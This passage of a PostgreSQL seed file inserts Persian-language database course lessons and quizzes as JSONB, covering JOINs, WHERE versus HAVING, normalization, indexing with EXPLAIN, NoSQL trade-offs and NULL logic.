دقیق بگذار تا حاصل‌ضرب دکارتی نسازی"]}]'::jsonb, '[{"q":"LEFT JOIN چه چیزی برمی‌گرداند؟","opts":["فقط تقاطع","همه ردیف‌های جدول چپ، با تطابق‌های راست؛ و NULL برای بی‌تطابق‌ها","همه دو طرف","هیچ"],"ans":1,"why":"LEFT یعنی «سمت چپ کامل باشد»؛ پس ردیف‌های بدون تطابق هم می‌آیند ولی ستون‌های راست NULL می‌شوند."},{"q":"چرا برای پیدا کردن «کاربران بدون سفارش» باید از IS NULL استفاده کرد؟","opts":["سلیقه‌ای است","چون بعد از LEFT JOIN، سفارش‌نداشتن به‌صورت NULL در ستون‌های راست ظاهر می‌شود","چون = NULL کار نمی‌کند","هر دو مورد"],"ans":3,"why":"هم NULL نشان‌دهنده نبودن است و هم در SQL هیچ‌چیز با NULL برابر نیست؛ پس باید IS NULL نوشت."},{"q":"اگر JOIN بدون شرط ON بنویسی چه می‌شود؟","opts":["خطای سینتکس","حاصل‌ضرب دکارتی: هر ردیف چپ به همه ردیف‌های راست وصل می‌شود","INNER می‌شود","خالی برمی‌گردد"],"ans":1,"why":"بدون شرط، هر ترکیبی مجاز است؛ پس n ردیف چپ × m ردیف راست نتیجه می‌شود که معمولاً فاجعه است."}]'::jsonb),
('c11-l1', 'sql', 'مدل رابطه‌ای و SQL', 55, 2, '[{"k":"p","t":"در مدل رابطه‌ای داده در جدول‌هایی از ردیف و ستون ذخیره می‌شود و جدول‌ها با کلید خارجی به هم وصل می‌شوند. SQL زبان اعلامی است: نمی‌گویی «چطور» بگرد، می‌گویی «چه» می‌خواهی — و موتور query خودش بهترین مسیر را پیدا می‌کند."},{"k":"code","lang":"sql","title":"schema.sql","code":"CREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    email VARCHAR(255) UNIQUE NOT NULL,\n    name VARCHAR(100) NOT NULL,\n    created_at TIMESTAMP DEFAULT NOW()\n);\n\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    user_id INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n    total NUMERIC(10, 2) NOT NULL,\n    status VARCHAR(20) DEFAULT ''pending''\n);\n\nCREATE INDEX idx_orders_user ON orders(user_id);"},{"k":"h","t":"JOIN؛ وصل‌کردن جدول‌ها"},{"k":"code","lang":"sql","title":"join.sql","code":"-- سفارش‌های هر کاربر با مجموع خرید\nSELECT u.name,\n       COUNT(o.id) AS order_count,\n       COALESCE(SUM(o.total), 0) AS spent\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id\nGROUP BY u.id, u.name\nHAVING COALESCE(SUM(o.total), 0) > 1000000\nORDER BY spent DESC\nLIMIT 10;"},{"k":"def","term":"LEFT JOIN","t":"همه ردیف‌های جدول چپ را نگه می‌دارد حتی اگر در جدول راست جفتی نداشته باشند (ستون‌های راست NULL می‌شوند). INNER JOIN فقط جفت‌شده‌ها را برمی‌گرداند — برای گزارش «همه کاربران حتی بدون خرید»، LEFT لازم است."},{"k":"warn","title":"ترتیب WHERE و HAVING","t":"WHERE قبل از گروه‌بندی فیلتر می‌کند و HAVING بعد از آن. شرط روی ستون تجمیعی (مثل SUM) فقط در HAVING مجاز است — یکی از رایج‌ترین خطاهای SQL تازه‌کارها."},{"k":"h","t":"عمیق‌تر: Joinها — قلب تپنده رابطه‌ای"},{"k":"p","t":"قدرت مدل رابطه‌ای در یک کلمه خلاصه می‌شود: Join — چسباندن جدول‌ها با یک شرط برابری. INNER JOIN فقط ردیف‌های دوطرفه را نگه می‌دارد؛ LEFT JOIN همه ردیف‌های چپ را نگه می‌دارد و سمت راست را با NULL پر می‌کند — پس برای «کاربرانی که هیچ سفارشی ندارند» و «گزارش‌های کامل» LEFT JOIN لازم است. یک ترفند مصاحبه‌ای: پیدا کردن «نداشتن» با LEFT JOIN ... WHERE b.id IS NULL — چون NOT IN با NULLها رفتار غافلگیرکننده‌ای دارد. RIGHT JOIN عملاً هیچ‌وقت لازم نمی‌شود؛ فقط جهت نوشتن را عوض کن و LEFT بنویس تا کوئری از راست به چپ مثل متن فارسی خوانده شود."},{"k":"p","t":"یک اشتباه مفهومی رایج: فکر کنیم دیتابیس کوئری را به ترتیبی که می‌نویسیم اجرا می‌کند. واقعیت این است که SELECT آخرین مرحله منطقی است — اول FROM و Joinها، بعد WHERE، بعد GROUP BY، بعد HAVING و آخر SELECT. دو نتیجه عملی: ۱) در WHERE نمی‌توانی از ستون‌های محاسباتی SELECT (Aliasها) استفاده کنی — باید در HAVING بیایی؛ ۲) WHERE قبل از گروه‌بندی فیلتر می‌کند و HAVING بعد از آن — پس «سفارش‌های بالای ۱۰۰ هزار تومان از مشتریانی که مجموع خریدشان بالای یک میلیون است» یعنی WHERE روی مبلغ سفارش و HAVING روی SUM. فهم این ترتیب، نیمی از کوئری‌های «چرا کار نمی‌کند» را حل می‌کند."},{"k":"code","lang":"sql","title":"deepdive-join.sql","code":"-- INNER: فقط مشتری‌هایی که خرید دارند\nSELECT c.name, COUNT(o.id) AS orders\nFROM customers c\nJOIN orders o ON o.customer_id = c.id\nGROUP BY c.id, c.name;\n\n-- LEFT + IS NULL: مشتری‌های بدون خرید (سوال محبوب مصاحبه)\nSELECT c.name\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nWHERE o.id IS NULL;\n\n-- ترتیب منطقی اجرا — WHERE در برابر HAVING:\nSELECT c.name, SUM(o.total) AS lifetime\nFROM customers c\nJOIN orders o ON o.customer_id = c.id\nWHERE o.status = ''paid''              -- فیلتر ردیف، قبل از گروه\nGROUP BY c.id, c.name\nHAVING SUM(o.total) > 1000000        -- فیلتر گروه، بعد از جمع\nORDER BY lifetime DESC\nLIMIT 10;"},{"k":"p","t":"وقتی کوئری پیچیده می‌شود، CTE (WITH) نجات‌بخش است: به‌جای تودرتوی Subquery، مراحل را نام‌گذاری کن و مثل پاراگراف‌های یک داستان بخوان. از PostgreSQL 12 به بعد CTEها حتی materialization خودکار دارند و خوانایی را بدون هزینه می‌خرند. قانون تیم‌های حرفه‌ای: اگر Subquery از دو سطح تودرتو رد شد، CTE بنویس — کوئری‌ای که نتوانی شش ماه بعد بخوانیش، مال تو نیست، مال کسی است که ساعت ۳ صبح باید دیباگش کند."},{"k":"tip","title":"نکته منتور","t":"یک دیتابیس نمونه محلی (مثل DVD Rental PostgreSQL) نصب کن و هر روز ۲۰ دقیقه کوئری بنویس — join سه‌جدولی، GROUP BY با HAVING، و Window Functionها. SQL مثل رانندگی است؛ خواندنش راحت، ولی مهارتش فقط با فرمان‌گرفتن به‌دست می‌آید. سایت‌هایی مثل SQLBolt و PGExercises مسیر آماده دارند."}]'::jsonb, '[{"q":"تفاوت WHERE و HAVING چیست؟","opts":["هیچ تفاوتی ندارند","WHERE قبل از GROUP BY فیلتر می‌کند، HAVING بعد از آن","HAVING سریع‌تر است","WHERE فقط برای عدد کار می‌کند"],"ans":1,"why":"WHERE ردیف‌های خام را فیلتر می‌کند و HAVING گروه‌های ساخته‌شده را؛ پس شرط روی COUNT/SUM جای HAVING است."},{"q":"ON DELETE CASCADE چه می‌کند؟","opts":["جلوی حذف کاربر را می‌گیرد","با حذف کاربر، سفارش‌هایش هم حذف می‌شوند","سفارش‌ها را آرشیو می‌کند","خطای 500 می‌دهد"],"ans":1,"why":"CASCADE یعنی حذف از والد به فرزند سرریز می‌کند؛ بدون آن، حذف کاربر به‌خاطر کلید خارجی خطا می‌دهد."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('c11-l2', 'sql', 'نرمال‌سازی و اینکس', 65, 3, '[{"k":"p","t":"نرمال‌سازی یعنی حذف افزونگی داده: هر حقیقت فقط یک جا ذخیره شود تا به‌روزرسانی آن در هزار ردیف لازم نشود. اما نرمال‌سازی افراطی JOINهای سنگین می‌سازد؛ هنر مهندس، یافتن تعادل است — Denormalization آگاهانه برای سرعت خواندن، کاملاً مشروع است."},{"k":"list","items":["1NF: هر سلول یک مقدار اتمی؛ آرایه داخل ستون ممنوع","2NF: ستون‌های غیرکلیدی به کل کلید وابسته باشند نه بخشی از آن","3NF: هیچ ستون غیرکلیدی به ستون غیرکلیدی دیگر وابسته نباشد","مثال نقض: ذخیره نام شهر در جدول سفارش، وقتی شهر از کدپستی قابل‌استخراج است"]},{"k":"visual","visual":"hashTable","title":"شبیه‌ساز: ایندکس، هشِ دیتابیس"},{"k":"h","t":"اینکس؛ فهرست مطالب کتاب"},{"k":"p","t":"بدون اینکس، هر WHERE کل جدول را اسکن می‌کند (O(n)). اینکس ساختار درختی B-Tree است که ستون را مرتب نگه می‌دارد و جست‌وجو را به O(log n) می‌رساند — اما نوشتن را کمی گران‌تر می‌کند، چون هر INSERT باید اینکس را هم به‌روز کند."},{"k":"code","lang":"sql","title":"explain.sql","code":"-- قبل از اینکس: Seq Scan روی 5 میلیون ردیف\nEXPLAIN ANALYZE\nSELECT * FROM orders WHERE status = ''failed'';\n\nCREATE INDEX idx_orders_status ON orders(status);\n\n-- بعد: Index Scan در چند میلی‌ثانیه\nEXPLAIN ANALYZE\nSELECT * FROM orders WHERE status = ''failed'';"},{"k":"warn","title":"ایندکس رایگان نیست","t":"هر اینکس هم حافظه می‌گیرد و هم هر نوشتن را کندتر می‌کند. روی هر ستونی اینکس نزن؛ اول با EXPLAIN ANALYZE گلوگاه واقعی را پیدا کن، بعد فقط همان‌جا."},{"k":"tip","title":"نکته منتور","t":"قاعده سرانگشتی: ستون‌هایی که در WHERE، JOIN و ORDER BY زیاد می‌آیند کاندید ایندکس‌اند؛ ستون‌هایی با تنوع کم (مثل جنسیت) معمولاً اینکس مفیدی نمی‌سازند."},{"k":"h","t":"عمیق‌تر: نرمال‌سازی — چرا تکرار دشمن داده است"},{"k":"p","t":"داده تکراری فقط هدرِ دیسک نیست — بمب ساعتیِ ناسازگاری است: اگر آدرس مشتری در سه جدول کپی شده، روزی یکی عوض می‌شود و دوتا نه؛ آن‌وقت «حقیقت» سه نسخه دارد و هیچ‌کس نمی‌داند کدام. نرمال‌سازی پاسخ سیستماتیک است: 1NF یعنی هر سلول اتمی و تکراری نباشد؛ 2NF یعنی هر ستون غیرکلیدی به کلِ کلید وابسته باشد نه بخشی از آن؛ 3NF یعنی ستون‌های غیرکلیدی به ستون غیرکلیدی دیگر وابسته نباشند. به زبان ساده: «هر حقیقت، یک خانه» — و هر خانه فقط یک بار به‌روز می‌شود."},{"k":"p","t":"اما نرمال‌سازی کامل، قانون فیزیک نیست — معامله‌ای است بین درستی نوشتن و سرعت خواندن. دیتابیس‌های تحلیلی (Data Warehouse) عمداً Denormalize می‌کنند: ستار schema با جدول Fact و Dimensionها، تکرارِ کنترل‌شده را می‌پذیرد چون الگوی خواندن ثابت و حجیم است و Joinهای متعدد روی میلیارد‌ها ردیف گران. معیار تصمیم ساده: سیستم تراکنشی (OLTP) → نرمال تا 3NF؛ سیستم تحلیلی (OLAP) → طرح ستاره. و همیشه قبل از Denormalize کردن، یک ایندکس خوب را امتحان کن — ۹۰٪ مواقع مشکل سرعت، تکرار نیست، ایندکس است."},{"k":"code","lang":"sql","title":"deepdive-normal.sql","code":"-- ضدالگو: حقیقت در چند جا\n-- orders(id, customer_name, customer_city, product_name, ...)\n-- تغییر شهر مشتری = آپدیت هزار ردیف!\n\n-- نرمال‌شده: هر حقیقت یک خانه\nCREATE TABLE customers (\n  id          SERIAL PRIMARY KEY,\n  name        TEXT NOT NULL,\n  city        TEXT NOT NULL);          -- شهر فقط این‌جا\n\nCREATE TABLE products (\n  id          SERIAL PRIMARY KEY,\n  name        TEXT NOT NULL,\n  price       NUMERIC(12,2) NOT NULL); -- قیمت فقط این‌جا\n\nCREATE TABLE orders (\n  id          SERIAL PRIMARY KEY,\n  customer_id INT NOT NULL REFERENCES customers(id),\n  product_id  INT NOT NULL REFERENCES products(id),\n  qty         INT NOT NULL,\n  price_at_order NUMERIC(12,2) NOT NULL  -- استثنا آگاهانه!\n);  -- قیمت لحظه خرید باید snapshot شود؛ تغییر قیمت فردا\n    -- نباید فاکتور دیروز را عوض کند — این Denormalize نیست،\n    -- درست مدل‌کردن زمان است."},{"k":"warn","title":"استثنای حیاتی","t":"مقادیر «لحظه رویداد» را هرگز Join زنده نگه ندار: قیمت فاکتور، نرخ ارز معامله، نام کاربر هنگام امضای قرارداد. اگر این‌ها را به جدول زنده ارجاع بدهی، تاریخ گذشته‌ات با هر تغییر امروز بازنویسی می‌شود — و حسابداری‌ات یک روز منفجر می‌شود. Snapshot گرفتن در زمان نوشتن، قانون طلایی سیستم‌های مالی است."},{"k":"table","head":["فرم نرمال","قانون به زبان ساده","ویولیشن رایج"],"rows":[["1NF","سلول اتمی؛ گروه تکراری ممنوع","ستون phone1, phone2, phone3"],["2NF","وابستگی به کلِ کلید مرکب","در (order, product)، نام محصول به product تنها وابسته است"],["3NF","ستون غیرکلیدی از ستون غیرکلیدی دیگر محاسبه نشود","total = qty × price در جدول ذخیره شود"],["BCNF","هر وابستگی فقط به کلید باشد","قانون «معلم-درس-کلاس» کلاسیک"]]}]'::jsonb, '[{"q":"چرا اینکس، INSERT را کندتر می‌کند؟","opts":["نمی‌کند","چون ساختار درختی اینکس هم باید به‌روز شود","چون اینکس قفل می‌گذارد","چون لاگ می‌نویسد"],"ans":1,"why":"هر ردیف جدید باید جای درستش در B-Tree اینکس پیدا و درج شود؛ پس نوشتن روی جدول پر از اینکس گران‌تر است."},{"q":"هدف اصلی نرمال‌سازی چیست؟","opts":["سرعت خواندن","حذف افزونگی و جلوگیری از ناسازگاری داده","کاهش حجم دیتابیس","ساده‌تر شدن query"],"ans":1,"why":"وقتی یک حقیقت یک جا ذخیره شود، به‌روزرسانی آن در یک ردیف انجام می‌شود و امکان داده متناقض از بین می‌رود."}]'::jsonb),
('c11-l3', 'sql', 'NoSQL؛ کجا و چرا', 55, 4, '[{"k":"p","t":"NoSQL یعنی «نه فقط SQL»؛ خانواده‌ای از دیتابیس‌ها که مدل رابطه‌ای را برای مقیاس یا انعطاف خاص رها می‌کنند. مهم‌ترین درس این جلسه: انتخاب دیتابیس بر اساس الگوی دسترسی داده است، نه مد روز."},{"k":"table","head":["نوع","مثال","مناسب برای"],"rows":[["Document","MongoDB","داده نیمه‌ساختاری با schema متغیر"],["Key-Value","Redis","کش، Session، شمارنده"],["Column-Family","Cassandra","نوشتن حجیم و توزیع‌شده"],["Graph","Neo4j","شبکه‌های اجتماعی، تقلب‌یابی"]]},{"k":"code","lang":"js","title":"mongo.js","code":"// Document: کل سفارش یک سند، بدون JOIN\nconst order = {\n    user: { id: 42, name: \"Ali\" },\n    items: [\n        { sku: \"A-1\", qty: 2, price: 350000 },\n        { sku: \"B-7\", qty: 1, price: 120000 },\n    ],\n    status: \"paid\",\n    createdAt: new Date(),\n};\n\nawait orders.insertOne(order);\n\n// query: تو در تو اما بدون JOIN\nawait orders.find({ \"items.sku\": \"A-1\", status: \"paid\" }).toArray();"},{"k":"def","term":"CAP و Trade-off","t":"در سیستم توزیع‌شده نمی‌توان همزمان سازگاری (C)، دسترس‌پذیری (A) و تحمل پارتیشن (P) را کامل داشت. SQL معمولاً CP و بسیاری از NoSQLها AP را ترجیح می‌دهند؛ انتخاب یعنی پذیرش آگاهانه این مصالحه."},{"k":"warn","title":"اشتباه رایج","t":"رفتن سراغ NoSQL فقط برای «فرار از JOIN و schema» معمولاً پشیمانی می‌آورد؛ چون تراکنش و گزارش‌گیری رابطه‌ای را از دست می‌دهی. اول مطمئن شو الگوی دسترسی‌ات واقعاً با مدل سند یا کلید-مقدار جور است."},{"k":"h","t":"عمیق‌تر: قضیه CAP و انتخاب آگاهانه"},{"k":"p","t":"قضیه CAP می‌گوید در یک سیستم توزیع‌شده، وقتی شبکه پارتیشن می‌شود (و بالاخره می‌شود)، فقط دو تا از سه ضمانت ممکن است: سازگاری (همه نودها همان لحظه یک داده را نشان دهند)، دسترس‌پذیری (هر درخواستی پاسخ بگیرد) و تحمل پارتیشن. چون پارتیشن واقعیت اجتناب‌ناپذیر شبکه است، انتخاب واقعی بین CP و AP است: بانک CP است — حاضر است چند ثانیه «در دسترس نباشد» تا دو شعبه عدد متفاوت نشان ندهند؛ سبد خرید فروشگاه AP است — حتی در پارتیشن اجازه خرید می‌دهد و بعداً همگرا می‌شود. قبل از هر انتخاب دیتابیس، بپرس: سیستم من در لحظه پارتیشن، کدام اشتباه را می‌تواند تحمل کند؟"},{"k":"p","t":"خانواده‌های NoSQL هرکدام برای یک «شکل دسترسی» طراحی شده‌اند و نام‌شان همان راهنماست: Document (MongoDB) برای داده نیمه‌ساختاری که با هم خوانده می‌شود — سندی که یک‌جا می‌آید بدون Join؛ Column-family (Cassandra) برای نوشتنِ بسیار زیاد و خواندن با کلید — لاگ‌ها و IoT؛ Key-Value (Redis) برای سرعت محض — کش، صف، Session؛ و Graph (Neo4j) برای روابطِ عمیق — شبکه اجتماعی، تقلب‌یابی که الگویش «دوستِ دوستِ دوست» است. اشتباه کلاسیک: انتخاب NoSQL به‌خاطر «مدرن‌بودن» — در حالی که دیتای کاملاً رابطه‌ای داری و فقط از Joinهای پیچیده خسته شده‌ای؛ راه‌حل خستگی، CTE و Window Function است نه ترک رابطه‌ای."},{"k":"table","head":["سناریو","انتخاب منطقی","چرا"],"rows":[["سیستم مالی/سفارش‌ها","PostgreSQL + تراکنش","ACID و سازگاری قوی حیاتی است"],["کش و شمارنده","Redis","زیرمیلی‌ثانیه؛ اشکالی ندارد گاهی گم شود"],["پروفایل کاربر با فیلدهای متغیر","MongoDB","شکل منعطف؛ خواندن یک سند کامل"],["تایم‌لاین/لاگ حجیم","Cassandra یا ClickHouse","نوشتن نجومی، خواندن با کلید"],["کشف تقلب/توصیه","Neo4j","پیمایش رابطه چندپرشه"],["جست‌وجوی متن","Elasticsearch","Inverted index — مکمل دیتابیس اصلی"]]},{"k":"p","t":"معماری رایج دنیای واقعی «Polyglot Persistence» است اما با ترتیب واضح: Postgres به‌عنوان «منبع حقیقت» که هیچ داده‌ای در آن گم نمی‌شود، و بقیه دیتابیس‌ها به‌عنوان نمای مشتق‌شده که از روی آن ساخته و در صورت نیاز بازسازی می‌شوند. کش پرید؟ از Postgres بساز. ایندکس جست‌وجو خراب شد؟ دوباره Reindex کن. تا زمانی که منبع حقیقت یکی است و بقیه قابل‌بازسازی، معماری‌ات سالم است؛ لحظه‌ای که دو دیتابیس همزمان «منبع حقیقت» شوند، ناسازگاری فقط مسئله زمان است."},{"k":"tip","title":"نکته منتور","t":"در مصاحبه‌های بک‌اند، «کی از NoSQL استفاده می‌کنی؟» سوال دام است. جواب قوی با سوال شروع می‌شود: «الگوی دسترسی چیست؟ حجم نوشتن چقدر؟ آیا تراکنش لازم است؟» و بعد: «پیش‌فرضم Postgres است مگر دلیل مشخصی داشته باشم — چون ACID رایگان است و Joین‌هایش بالغ». این جواب، بلوغ مهندسی را نشان می‌دهد نه تعصب تکنولوژیک."}]'::jsonb, '[{"q":"برای Session کاربرها در یک فروشگاه بزرگ کدام انتخاب منطقی‌تر است؟","opts":["PostgreSQL","Redis","MongoDB","Neo4j"],"ans":1,"why":"Session خواندن و نوشتن کلید-مقدار بسیار سریع با TTL است — دقیقاً تخصص Redis؛ نه JOIN لازم است نه query پیچیده."},{"q":"مزایای ذخیره کل سفارش در یک سند Mongo چیست؟","opts":["اینکس بهتر","خواندن سفارش بدون JOIN و مطابق ساختار برنامه","حجم کمتر","تراکنش قوی‌تر"],"ans":1,"why":"برنامه شیء سفارش را یک‌جا می‌خواند و می‌نویسد؛ مدل داده دقیقاً شکل کد است — اما گزارش‌های تجمیعی سخت‌تر می‌شود."}]'::jsonb),
('sql-x1', 'sql', 'ایندکس و EXPLAIN — وقتی کوئری کند می‌شود', 55, 5, '[{"k":"p","t":"کوئری که روی هزار رکورد برق‌آساست، روی یک میلیون رکورد ناگهان ۸ ثانیه طول می‌کشد — چون بدون ایندکس، دیتابیس مجبور است «اسکن کامل» کند: خواندن تک‌تک ردیف‌ها. ایندکس یعنی یک نسخه مرتب و فشرده از یک ستون که جست‌وجو را از O(n) به O(log n) می‌رساند — همان درخت B-Tree که در ساختمان داده دیدی."},{"k":"visual","visual":"bigo","title":"یادآوری: تفاوت O(n) و O(log n) در یک میلیون رکورد"},{"k":"code","lang":"sql","title":"explain.sql","code":"-- بدون ایندکس:\nEXPLAIN ANALYZE\nSELECT * FROM orders WHERE customer_id = 4321;\n-- Seq Scan on orders  (rows=1000000)  → 8450 ms  ❌\n\nCREATE INDEX idx_orders_customer ON orders (customer_id);\n\n-- با ایندکس:\nEXPLAIN ANALYZE\nSELECT * FROM orders WHERE customer_id = 4321;\n-- Bitmap Index Scan using idx_orders_customer  →  3.2 ms  ✓"},{"k":"def","term":"Selectivity","t":"اینکه ایندکس چقدر از ردیف‌ها را حذف می‌کند. جست‌وجوی یک customer_id خاص یعنی انتخاب‌پذیری عالی؛ ولی WHERE gender = ''F'' روی داده‌ای که نصفش زن است، ایندکس را بی‌فایده می‌کند — دیتابیس خودش اسکن کامل را ترجیح می‌دهد و درست هم می‌کند."},{"k":"list","items":["ستون‌های WHERE، JOIN و ORDER BY پرکاربرد را ایندکس کن","ایندکس مرکب: ترتیب ستون‌ها مهم است — (a, b) برای جست‌وجوی a یا a+b کار می‌کند، نه b تنها","هر ایندکس هزینه نوشتن دارد: INSERT/UPDATE باید درخت را هم به‌روز کنند","با EXPLAIN ANALYZE ببین دیتابیس واقعاً از ایندکس استفاده کرد یا نه — حدس نزن!"]},{"k":"code","lang":"sql","title":"ایندکس مرکب","code":"-- برای این کوئری:\nSELECT * FROM orders\nWHERE customer_id = 42 AND status = ''paid''\nORDER BY created_at DESC LIMIT 20;\n\n-- این ایندکس هر سه مرحله را پوشش می‌دهد:\nCREATE INDEX idx_orders_c_s_d\n  ON orders (customer_id, status, created_at DESC);\n-- فیلتر → فیلتر → مرتب‌سازی آماده؛ بدون Sort اضافی"},{"k":"warn","title":"ایندکس‌بازی","t":"جدول ۱۰ ایندکسی یعنی هر INSERT ده درختِ به‌روزرسانی. قانون: اول EXPLAIN، بعد ایندکس، بعد دوباره EXPLAIN. و ایندکس‌های استفاده‌نشده را با پرس‌وجوی pg_stat_user_indexes پیدا و حذف کن — حافظه و سرعت نوشتن هدیه نمی‌دهند."},{"k":"tip","title":"نکته منتور","t":"در مصاحبه‌های بک‌اند، «کوئری کند شد؛ چه می‌کنی؟» تقریباً همیشه می‌آید. جواب ساختارمند: ۱) EXPLAIN برای دیدن پلن ۲) تشخیص Seq Scan ۳) ایندکس روی ستون فیلتر ۴) بررسی Selectivity ۵) اندازه‌گیری دوباره. این ترتیب، جواب مهندس است نه حدس."}]'::jsonb, '[{"q":"چرا ایندکس جست‌وجو را سریع می‌کند؟","opts":["داده را فشرده می‌کند","یک ساختار مرتب (B-Tree) از ستون نگه می‌دارد که جست‌وجوی log n دارد","کوئری را کش می‌کند","رمزگشایی را حذف می‌کند"],"ans":1,"why":"B-Tree با هر مقایسه بخش بزرگی را حذف می‌کند؛ یافتن موقعیت در یک میلیون رکورد حدود ۲۰ مقایسه است نه یک میلیون."},{"q":"چرا ایندکس، نوشتن را کند می‌کند؟","opts":["قفل می‌گذارد","هر INSERT/UPDATE باید ساختار ایندکس را هم به‌روز و متوازن نگه دارد","لاگ بیشتری می‌نویسد","نمی‌کند"],"ans":1,"why":"ایندکس یک کپی مرتب است؛ تغییر داده یعنی حفظ ترتیب آن کپی — درج در وسط درخت با Split همراه است. به همین دلیل جدول‌های فقط‌نوشتنی (لاگ‌ها) ایندکس کمتری می‌گیرند."}]'::jsonb),
('sql-b1', 'sql', 'SELECT و فیلتر با WHERE', 63, 6, '[{"k":"p","t":"SELECT پایه همه پرس‌وجوهاست؛ WHERE ردیف‌ها را فیلتر می‌کند و ترتیب نوشتن با ترتیب اجرا فرق دارد — اول FROM و WHERE، بعد SELECT."},{"k":"h","t":"SELECT declarative است؛ تو «چه» می‌خواهی نه «چطور»"},{"k":"p","t":"تفاوت بنیادی SQL با کد معمولی: در حلقه می‌گویی «یکی‌یکی بگرد تا پیدا کنی»؛ در SQL می‌گویی «همه ردیف‌هایی که این شرط را دارند بده» و موتور جست‌وجو خودش تصمیم می‌گیرد چطور — با ایندکس، اسکن کامل یا هر راه سریع‌تری. این یعنی یک query درست می‌تواند بسته به داده و ایندکس‌ها، صدها راه اجرا داشته باشد و موتور بهترینش را انتخاب کند (Query Planner). حالا می‌فهمی چرا «نوشتن query» نیمی از کار است و نیم دیگر «فهمیدنِ چرا این‌طور اجرا شد» با EXPLAIN — و چرا همان query با یک ایندکس، هزار برابر سریع‌تر می‌شود بدون اینکه یک کاراکتر عوض کنی."},{"k":"h","t":"منطق سه‌حالته NULL؛ جایی که همه اشتباه می‌کنند"},{"k":"p","t":"در SQL، NULL یعنی «نمی‌دانم» — و با هیچ‌چیز قابل‌مقایسه نیست، حتی با خودش: NULL = NULL جوابش true نیست، NULL است! پس WHERE name = NULL هیچ ردیفی برنمی‌گرداند؛ باید بنویسی WHERE name IS NULL. و هر محاسبه‌ای با NULL، NULL می‌شود (5 + NULL = NULL) و شرط‌های false به‌خاطر NULL حذف می‌شوند — مثل WHERE age > 18 که ردیف‌های age=NULL را بی‌صدا کنار می‌گذارد. در توابع تجمیعی هم NULLها نادیده گرفته می‌شوند (AVG روی سه نمره که یکی NULL است، میانگین دوتاست نه سه‌تا). قاعده دفاعی: هر جا ستونی nullable است، قبل از مقایسه صریحاً تکلیفش را روشن کن (COALESCE(amount, 0) یا IS NULL)."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"sql","title":"فیلترهای واقعی با مراقبت از NULL","code":"-- مشتری‌های تهرانی با خرید بالای ۵۰۰ هزار\nSELECT name, phone\nFROM customers\nWHERE city = ''تهران''\n  AND total_purchase > 500000\nORDER BY total_purchase DESC\nLIMIT 20;\n\n-- خطر: اگر total_purchase برخی NULL باشد،\n-- مقایسه NULL می‌شود و بی‌صدا حذف می‌شوند!\n-- نسخه آگاهانه:\nSELECT name\nFROM customers\nWHERE COALESCE(total_purchase, 0) > 500000;\n\n-- پیداکردن بی‌خریدها:\nSELECT name FROM customers\nWHERE total_purchase IS NULL;   -- نه = NULL!"},{"k":"def","term":"منطق سه‌حالته (Three-Valued Logic)","t":"در SQL هر شرط یکی از سه مقدار TRUE، FALSE یا UNKNOWN (ناشی از NULL) می‌گیرد و WHERE فقط ردیف‌های TRUE را نگه می‌دارد — UNKNOWN مثل FALSE حذف می‌شود ولی با NOT هم TRUE نمی‌شود؛ NOT(NULL) باز NULL است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["SELECT * همه ستون‌ها؛ بهتر است نام ببري","AND و OR و NOT ترکیب شرط‌ها؛ پرانتز برای اولویت","LIKE برای الگو و IN برای چند مقدار"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"select.sql","code":"SELECT name, price\nFROM products\nWHERE price > 100\n  AND category IN (''برق'', ''کامپیوتر'')\n  AND name LIKE ''%لپ%''\nORDER BY price DESC\nLIMIT 10;"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: SELECT * همه ستون‌ها؛ بهتر است نام ببري بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"ترتیب اجرای واقعی یک SELECT چیست؟","opts":["همان ترتیب نوشتن","FROM → WHERE → SELECT → ORDER BY → LIMIT","SELECT اول","LIMIT اول"],"ans":1,"why":"دیتابیس اول منبع و فیلتر را تعیین می‌کند، بعد ستون‌ها را برمی‌دارد و در آخر مرتب و محدود می‌کند."},{"q":"چرا WHERE score = NULL هیچ ردیفی برنمی‌گرداند؟","opts":["باگ است","چون مقایسه با NULL همیشه UNKNOWN است، نه true — باید نوشت IS NULL","NULL عدد نیست","بستگی به دیتابیس"],"ans":1,"why":"NULL یعنی مجهول؛ مجهول با هیچ‌چیز «برابر» نیست. عملگرهای مخصوص IS NULL و IS NOT NULL برای همین ساخته شده‌اند."},{"q":"LIMIT بدون ORDER BY چه خطری دارد؟","opts":["کند است","دیتابیس مختار است هر ردیفی را برگرداند — بدون ترتیب مشخص، نتیجه بین اجراها می‌تواند عوض شود","خطا می‌دهد","همه را برمی‌گرداند"],"ans":1,"why":"ردیف‌های جدول «ترتیب» ذاتی ندارند؛ بدون ORDER BY، «۲۰ تای اول» یعنی «۲۰ تای دلخواه موتور» — صفحه‌بندی تکرارپذیر بدون ORDER BY ممکن نیست."}]'::jsonb),
('sql-b2', 'sql', 'JOIN و انواع آن', 63, 7, '[{"k":"p","t":"JOIN ردیف‌های دو جدول را بر اساس ستون مشترک ترکیب می‌کند؛ INNER فقط مشترک‌ها، LEFT همه چپ‌ها و RIGHT همه راست‌ها را نگه می‌دارد."},{"k":"h","t":"JOIN یعنی «بازسازی حقیقت پخش‌شده»"},{"k":"p","t":"نرمال‌سازی داده را پخش می‌کند: اسم مشتری یک‌جا، سفارش‌ها جای دیگر — تا تکرار نشود. JOIN کار عکسش را می‌کند: با تطبیق کلید، حقیقتِ پخش‌شده را برای نمایش دوباره سر هم می‌بندد. INNER JOIN فقط جفت‌های منطبق را نگه می‌دارد (سفارش‌هایی که مشتری‌شان هست)؛ LEFT JOIN همه ردیف‌های جدول چپ را نگه می‌دارد و نمنطبق‌ها را با NULL پر می‌کند — پس برای «همه مشتریان، حتی بی‌سفارش» یا «سفارش‌های بدون پرداخت» عالی است. و تشخیص ردیف‌های NULL-پر‌شده دقیقاً با WHERE o.id IS NULL انجام می‌شود — الگوی «پیدا کردن گمشده‌ها». RIGHT JOIN 